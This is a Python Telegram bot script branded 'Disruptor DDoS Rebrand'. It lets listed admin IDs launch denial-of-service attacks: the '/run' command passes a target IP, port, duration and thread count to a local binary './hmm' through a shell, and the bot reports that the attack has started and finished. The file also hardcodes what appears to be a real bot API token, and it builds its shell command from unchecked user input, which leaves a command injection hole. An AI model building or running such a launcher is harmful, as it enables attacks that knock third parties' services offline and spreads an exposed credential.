import telebot
import json
import logging
import time
import subprocess

logging.basicConfig(level=logging.INFO)

API_TOKEN = '6986808521:AAHvIIJuBfYEWE7Nem8MO4K6vLuFNSrBnuE'
ADMIN_IDS = {1024764441,6653508162}

bot = telebot.TeleBot(API_TOKEN)

def is_admin(user_id):
    return int(user_id) in ADMIN_IDS

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.from_user.id)
    if is_admin(user_id):
        bot.reply_to(message, "Welcome, admin! Thank you for using Disruptor DDoS Rebrand.")
    else:
        bot.reply_to(message, "You are not authorized to use this bot.")

@bot.message_handler(commands=['run'])
def run_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    args = message.text.split()[1:]
    if len(args) < 3 or len(args) > 4:
        bot.reply_to(message, "Usage: /run <IP> <port> <time> ")
        return

    ip, port, time_seconds = args[:3]
    threads = args[3] if len(args) == 4 else "240" 

    command = f"./hmm {ip} {port} {time_seconds} {threads}"
    bot.reply_to(message, f"🚀 Attack started on IP: {ip} Port: {port} Time: {time_seconds} seconds.")
    try:
        process = subprocess.run(command, shell=True, capture_output=True, text=True)
        response = f"Attack on {ip}:{port} completed 🚀"
        bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"Error executing command: {e}")

# Start polling
if __name__ == '__main__':
    bot.polling(none_stop=True)
